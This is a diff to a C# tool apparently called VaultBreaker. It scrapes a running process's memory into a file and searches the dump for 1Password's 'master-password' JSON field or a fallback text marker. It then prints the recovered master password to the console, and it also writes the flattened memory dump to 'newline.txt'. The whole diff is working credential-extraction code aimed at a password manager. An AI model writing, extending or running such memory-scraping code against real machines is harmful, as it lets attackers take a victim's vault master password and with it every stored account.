@@ -101,34 +101,61 @@ namespace VaultBreaker.Core
 							//Environment.Exit(24);
 						}
 					}
-					//Console.WriteLine("[DEBUG] Finished Memory Location");
-					//Console.WriteLine("[DEBUG] Adding {0} to hProc_long_min. Current Value: {1}", mbi.RegionSize, hProc_long_min + mbi.RegionSize);
 					hProc_long_min += mbi.RegionSize;
 					hProc_min_addr = new IntPtr(hProc_long_min);
 				}
 				sw.Close();
+				//Slightly Dirty, but keeping the <LF> conversion to help rule out False Positives in output.
+				string strResult = File.ReadAllText(fileName).Replace("\n", "<LF>").Replace("\0", String.Empty);
 
-				string strResult = File.ReadAllText(fileName);
-				//var matches = Regex.Matches(strResult, "offline_access").Cast<Match>().Select(m => m.Index);
-				//foreach (var match in matches)
-				//{
-				//	Console.WriteLine(match);
-				//}
+				File.WriteAllText("newline.txt", strResult);
+				DebugFunctions.writeDebug("Output to File");
 				if (strResult.Contains("{\"name\":\"master-password\",\"value\":\""))
 				{
+					DebugFunctions.writeDebug("JSON FOUND");
 					int start, end;
 					string strStartSearch = "{\"name\":\"master-password\",\"value\":\"";
 					start = strResult.IndexOf("{\"name\":\"master-password\",\"value\":\"", 0) + 35;
-					string strEndSearch = @""",""type"":,";
-					end = strResult.IndexOf(strEndSearch, 1);
-					DebugFunctions.writeDebug("strEndSearch: " + strResult.IndexOf(strEndSearch) + "\r\nstrStart: " + strResult.IndexOf(strStartSearch));
+					string strEndSearch = ",\"type\":\"P\",\"designation\":\"password\"},{\"name\":\"account-key\"";
+					end = strResult.IndexOf(strEndSearch, 0) - 1;
+					DebugFunctions.writeDebug("strEndSearch: " + strResult.IndexOf(strEndSearch) + "\r\n[DEBUG] strStart: " + strResult.IndexOf(strStartSearch));
 					//end = start + 100;
 					Console.WriteLine("Potential 1Password Password Location found: {0}", strResult.Substring(start, end - start));
 				}
+				else if (strResult.Contains("on 1password.com.<LF>")) {
+					DebugFunctions.writeDebug("Testing Backup");
+					int start, end;
+					string strStartSearch = "on 1password.com.<LF>";
+					start = strResult.IndexOf(strStartSearch, 0) + 20;
+					end = strResult.IndexOf("<LF>secret key<LF>");
+					Console.WriteLine("Potential 1Password Password Location found: {0}", strResult.Substring(start, end - start));
+					Console.ReadKey();
+				}
 				else
 				{
-					Console.WriteLine("Didn't Find");
+					Console.WriteLine("Not Found");
+					Console.ReadKey();
 				}
+				/**
+				else if (false)
+				{
+					Console.WriteLine("Entering");
+					int start, end;
+					string strStartSearch = "";
+					start = strResult.IndexOf(strStartSearch, 0) + 33;
+					//string strEndSearch = "s e c r ";
+					//end = strResult.IndexOf(strEndSearch, 0);
+					//DebugFunctions.writeDebug("strEndSearch: " + strResult.IndexOf(strEndSearch) + "\r\n[DEBUG] strStart: " + strResult.IndexOf(strStartSearch));
+					end = start + 100;
+					Console.WriteLine("Potential 1Password Password Location found: {0}", strResult.Substring(start, end - start));
+					Console.ReadKey();
+				}
+				else
+				{
+					Console.WriteLine("No find");
+					Console.ReadKey();
+				}
+	**/
 				Console.WriteLine("Fin. Press any key to exit");
 				Console.ReadKey();
 			}
